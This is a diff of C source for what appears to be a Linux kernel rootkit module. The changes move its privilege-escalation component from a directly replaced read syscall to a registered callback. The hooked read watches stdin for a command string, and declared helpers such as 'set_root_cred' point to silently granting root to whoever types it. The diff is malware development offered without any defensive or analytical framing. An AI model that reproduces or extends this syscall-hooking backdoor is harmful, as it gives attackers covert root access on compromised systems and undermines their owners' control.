@@ -26,6 +26,7 @@
 #include <linux/thread_info.h>
 #include <linux/sched.h>
 
+#include "core.h"
 
 /*******************************************************************************/
 /*                                                                             */
@@ -42,7 +43,6 @@
 
 /* Definition of global variables */
 static int show_debug_messages;
-asmlinkage long (*pe_original_read_syscall)(unsigned int, char __user *, size_t);   //TODO: should point to original_read
 int priv_escalate_matched_so_far;
 
 
@@ -50,7 +50,7 @@ int priv_escalate_matched_so_far;
 int privil_escalation_init(int);
 int privil_escalation_exit(void);
 
-asmlinkage long privil_escalation_read_syscall(unsigned int, char __user *, size_t);
+asmlinkage long privil_escalation_read_syscall(unsigned int, char __user *, size_t, long);
 
 static int count_matches(char *, char *, int *);
 static void set_root_cred(void);
@@ -68,6 +68,8 @@ int privil_escalation_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
+	register_callback(__NR_read, (void *)privil_escalation_read_syscall);
+
 	DEBUG_PRINT("initialized");
 
 	return 0;
@@ -76,6 +78,7 @@ int privil_escalation_init(int debug_mode_on)
 
 int privil_escalation_exit(void)
 {
+	deregister_callback(__NR_read, (void *)privil_escalation_read_syscall);
 
 	DEBUG_PRINT("exited");
 
@@ -85,13 +88,8 @@ int privil_escalation_exit(void)
 
 /* Function that replaces the original read syscall. In addition to what
    read syscall does, it also looks for a command. ... */
-asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
+asmlinkage long privil_escalation_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
 {
-	long ret;
-
-	/* Call original read syscall */
-	ret = pe_original_read_syscall(fd, buf, count);
-
 	/* If the read was not from STDIN don't do anything */
 	if (fd != 0)
 		return ret;
